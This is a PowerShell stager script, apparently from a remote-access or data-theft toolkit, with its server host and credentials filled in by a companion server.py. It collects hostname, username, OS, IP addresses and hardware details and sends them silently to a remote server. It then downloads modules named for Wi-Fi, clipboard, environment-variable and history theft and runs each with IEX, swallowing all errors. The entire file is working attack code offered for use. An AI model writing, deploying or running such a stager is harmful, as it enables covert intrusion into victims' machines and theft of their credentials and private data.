$H   = ""  # auto-patched by server.py
$P   = ""  # auto-patched by server.py
$AU  = "Basic "  # auto-patched by server.py

# --- generate target hash (stable per machine) ---
$raw = "$env:COMPUTERNAME$env:USERNAME"
$sha = [System.Security.Cryptography.SHA256]::Create()
$TH  = ([BitConverter]::ToString($sha.ComputeHash([Text.Encoding]::UTF8.GetBytes($raw))) -replace '-').Substring(0,8).ToLower()

# --- collect basic sysinfo ---
$os  = (Get-WmiObject Win32_OperatingSystem)
$cpu = (Get-WmiObject Win32_Processor | Select-Object -First 1).Name
$ram = [math]::Round((Get-WmiObject Win32_ComputerSystem).TotalPhysicalMemory/1GB, 2)
$ip  = (Get-NetIPAddress -AddressFamily IPv4 |
        Where-Object {
            $_.InterfaceAlias -notmatch 'Loopback' -and
            $_.IPAddress -notmatch '^169\.254\.' -and
            $_.IPAddress -ne '127.0.0.1'
        } |
        ForEach-Object { "$($_.InterfaceAlias): $($_.IPAddress)" }) -join ' | '

$info = @"
hostname : $env:COMPUTERNAME
user     : $env:USERNAME
os       : $($os.Caption) $($os.OSArchitecture)
ip       : $ip
pwd      : $(Get-Location)
cpu      : $cpu
ram      : ${ram} GB
time     : $(Get-Date -Format 'yyyy-MM-dd HH:mm:ss')
"@

# --- POST sysinfo (shows in terminal + saved as date_hash.txt) ---
$wc = New-Object Net.WebClient
$wc.Headers.Add("Authorization", $AU)
$wc.Headers.Add("Content-Type", "text/plain")
$wc.Headers.Add("X-Target", $TH)
try { $wc.UploadString("http://${H}:${P}/store/init", $info) } catch {}

# --- run each payload in order, continue if one fails ---
$payloads = @("recon.ps1", "wifi.ps1", "clipboard.ps1", "envvars.ps1", "history.ps1", "custom.ps1", "clearance.ps1", "mom.ps1")

foreach ($file in $payloads) {
    try {
        $wc2 = New-Object Net.WebClient
        $wc2.Headers.Add("Authorization", $AU)
        IEX($wc2.DownloadString("http://${H}:${P}/moduls/$file"))
    } catch {}
}
